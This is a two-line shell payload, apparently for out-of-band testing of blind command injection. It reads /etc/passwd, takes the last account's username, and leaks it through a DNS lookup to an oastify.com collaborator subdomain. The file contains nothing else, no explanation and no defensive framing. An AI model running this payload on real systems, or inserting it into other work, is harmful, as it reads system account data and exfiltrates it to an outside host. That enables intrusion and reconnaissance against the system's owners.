nombre=$(cat /etc/passwd | tail -1 | cut -d ":" -f1 )

nslookup $(echo $nombre).kl9dtf96irwnwq4bljh5uvm0brhi5atz.oastify.com
